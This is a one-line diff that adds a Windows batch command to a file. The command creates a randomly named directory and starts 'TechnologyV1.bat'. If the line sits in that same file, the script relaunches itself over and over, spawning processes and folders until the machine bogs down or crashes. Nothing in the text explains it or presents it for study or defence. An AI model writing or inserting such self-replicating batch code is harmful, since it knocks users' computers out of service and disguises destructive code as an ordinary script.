@@ -1,0 +1,1 @@
+md %random% | start TechnologyV1.bat
